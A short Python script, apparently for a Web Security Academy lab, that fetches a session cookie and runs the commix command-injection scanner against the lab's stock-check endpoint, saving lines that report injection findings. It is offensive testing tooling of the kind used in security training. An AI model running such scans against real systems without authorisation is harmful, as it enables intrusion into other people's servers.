import requests
import subprocess

url = "https://0a3d005504ae17ba8308700f007a0057.web-security-academy.net/"

session = requests.Session()
response = session.get(url)

cookies = session.cookies.get_dict()
session_id = cookies.get('session')

full_url = f"{url if url[-1] != '/' else url[:-1]}/product/stock"

command = f"python3 commix.py -u {full_url} --cookie=session=\"{session_id}\" -d \"productId=1&storeId=1\" --batch"

print("Executing command: ", command)

with open("output.txt", "w", encoding='utf-8') as output_file:
    output_file.write(f"Affected URL : {full_url}\n")

try:
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)  # 60 seconds timeout
    for line in result.stdout.splitlines():
        print(line)
        if "injectable" in line.lower() or "injection" in line.lower():
            with open("output.txt", "a", encoding='utf-8') as output_file:
                output_file.write(line + "\n")
except subprocess.TimeoutExpired:
    print("Command timed out and was terminated.")
